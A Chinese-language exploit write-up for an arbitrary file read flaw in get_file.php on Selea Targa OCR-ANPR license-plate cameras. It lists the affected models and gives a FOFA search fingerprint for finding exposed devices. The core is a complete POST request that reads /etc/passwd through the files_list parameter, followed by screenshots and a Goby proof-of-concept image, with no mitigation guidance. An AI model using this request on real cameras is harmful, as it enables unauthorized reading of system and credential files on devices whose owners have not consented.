# Selea OCR-ANPR摄像机 get_file.php 任意文件读取漏洞

## 漏洞描述

Selea OCR-ANPR摄像机 get_file.php存在 任意文件读取漏洞，通过构造特殊请求获取服务器文件

## 漏洞影响

> [!NOTE]
>
> Selea Selea Targa IP OCR-ANPR Camera iZero
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 512
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 504
>
> Selea Selea Targa IP OCR-ANPR Camera Targa Semplice
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 704 TKM
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 805
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 710 INOX
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 750
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 704 ILB

## FOFA

> [!NOTE]
>
> "selea_httpd"

## 漏洞复现

登录页面如下

![](http://wikioss.peiqi.tech/vuln/sel-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

发送如下请求包

```
POST /cgi-bin/get_file.php HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: lang=en; PHPSESSID=bvib0lq6lahlhbjnfv91k13ou0

name=test&files_list=/etc/passwd
```

![](http://wikioss.peiqi.tech/vuln/sel-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

## Goby & POC

![](http://wikioss.peiqi.tech/vuln/sel-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)